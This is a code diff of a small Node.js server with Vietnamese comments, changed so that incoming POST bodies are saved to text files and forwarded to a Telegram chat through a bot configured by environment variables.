@@ -1,26 +1,16 @@
 const http = require('http');
 const fs = require('fs');
+const axios = require('axios');
+const TelegramBot = require('node-telegram-bot-api');
+
+// Khởi tạo bot Telegram
+const telegramToken = process.env['TELEGRAM_TOKEN'];
+const chatId = process.env['CHAT_ID']; // ID của cuộc trò chuyện mà bạn muốn gửi tin nhắn đến
+const bot = new TelegramBot(telegramToken);
 
 // Tạo server
 const server = http.createServer((req, res) => {
-
-console.log("Request received");
-if (req.method === 'GET' && req.url === '/') {
-    // Đọc nội dung của tệp index.html
-    fs.readFile('intro.html', (err, data) => {
-      if (err) {
-        // Trường hợp có lỗi khi đọc tệp
-        console.error(err);
-        res.statusCode = 500;
-        res.end('Internal Server Error');
-      } else {
-        // Trường hợp không có lỗi, trả về nội dung HTML
-        res.writeHead(200, { 'Content-Type': 'text/html' });
-        res.end(data);
-      }
-    });
-  }
-  else if (req.method === 'POST') {
+  if (req.method === 'POST') {
     let body = '';
 
     // Nhận dữ liệu từ yêu cầu POST
@@ -28,7 +18,7 @@ if (req.method === 'GET' && req.url === '/') {
       body += chunk.toString();
     });
 
-    // Khi kết thúc yêu cầu POST, lưu nội dung vào file văn bản
+    // Khi kết thúc yêu cầu POST, lưu nội dung vào file văn bản và gửi đến Telegram
     req.on('end', () => {
       // Tạo tên file ngẫu nhiên
       const fileName = `request_${Date.now()}.txt`;
@@ -41,8 +31,22 @@ if (req.method === 'GET' && req.url === '/') {
           res.end('Internal Server Error');
         } else {
           console.log(`Saved request body to ${fileName}`);
-          res.statusCode = 200;
-          res.end('Request body saved successfully');
+
+          // Đường dẫn của file văn bản để gửi đến Telegram
+          const filePath = `./${fileName}`;
+
+          // Gửi file văn bản đến Telegram
+          bot.sendDocument(chatId, filePath)
+            .then(() => {
+              console.log('File sent to Telegram');
+              res.statusCode = 200;
+              res.end('Request body saved and sent to Telegram');
+            })
+            .catch(error => {
+              console.error('Error sending file to Telegram:', error);
+              res.statusCode = 500;
+              res.end('Error sending file to Telegram');
+            });
         }
       });
     });
